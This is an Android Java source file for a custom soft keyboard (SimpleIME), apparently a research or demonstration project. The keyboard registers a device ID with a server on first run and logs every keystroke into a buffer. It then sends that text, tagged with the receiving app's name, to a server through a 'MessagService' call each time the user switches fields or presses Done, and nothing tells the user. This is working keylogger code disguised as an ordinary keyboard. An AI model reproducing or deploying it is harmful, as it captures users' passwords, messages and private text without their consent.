package edu.cmu.keyboardhacker.simplekeyboard;

import android.content.SharedPreferences;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.preference.PreferenceManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import java.util.Date;
import java.util.UUID;

/**
 * Created by helunwen on 11/9/16.
 */
public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyboardActionListener {
    private KeyboardView kv;
    private Keyboard keyboard;

    private boolean caps = false;

    private StringBuffer stringBuffer = new StringBuffer();

    private InputConnection inputConnection;

    @Override
    public View onCreateInputView() {
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        boolean isFirstRun = sharedPreferences.getBoolean("FIRSTRUN", true);
        //If this the first run of app, generate device id and register in server.
        if (isFirstRun)
        {
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putBoolean("FIRSTRUN", false);
            editor.commit();
            new DeviceService(this.getDeviceId(), String.valueOf(System.currentTimeMillis())).execute();
        }
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        this.inputConnection = null;
        return kv;
    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        if (ic != this.inputConnection) {
            this.inputConnection = ic;
            if (this.stringBuffer.length() > 0) {
                new MessagService(
                        this.getDeviceId(),
                        String.valueOf(System.currentTimeMillis()),
                        this.stringBuffer.toString(),
                        this.getCurrentInputEditorInfo().packageName
                ).execute();
            }
            this.stringBuffer.setLength(0);
        }
        playClick(primaryCode);
        switch(primaryCode){
            case Keyboard.KEYCODE_DELETE :
                ic.deleteSurroundingText(1, 0);
                if (stringBuffer.length() > 0) {
                    stringBuffer.setLength(stringBuffer.length() - 1);
                }
                break;
            case Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                new MessagService(
                        this.getDeviceId(),
                        String.valueOf(System.currentTimeMillis()),
                        this.stringBuffer.toString(),
                        this.getCurrentInputEditorInfo().packageName
                ).execute();
                stringBuffer.setLength(0);
                break;
            default:
                char code = (char)primaryCode;
                if(Character.isLetter(code) && caps){
                    code = Character.toUpperCase(code);
                }
                stringBuffer.append(code);
                ic.commitText(String.valueOf(code), 1);
        }
    }

    /**
     * Get the device id.
     * @return device id
     * */
    private String getDeviceId() {
        String defaultDeviceId = UUID.randomUUID().toString();
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        if (sharedPreferences.contains("DEVICEID")) {
            return sharedPreferences.getString("DEVICEID", defaultDeviceId);
        } else {
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("DEVICEID", defaultDeviceId);
            editor.commit();
            return defaultDeviceId;
        }
    }
    @Override
    public void onPress(int primaryCode) {
    }

    @Override
    public void onRelease(int primaryCode) {
    }

    @Override
    public void onText(CharSequence text) {
    }

    @Override
    public void swipeDown() {
    }

    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {
    }

    @Override
    public void swipeUp() {
    }

    private void playClick(int keyCode){
        AudioManager am = (AudioManager)getSystemService(AUDIO_SERVICE);
        switch(keyCode){
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default: am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }
}
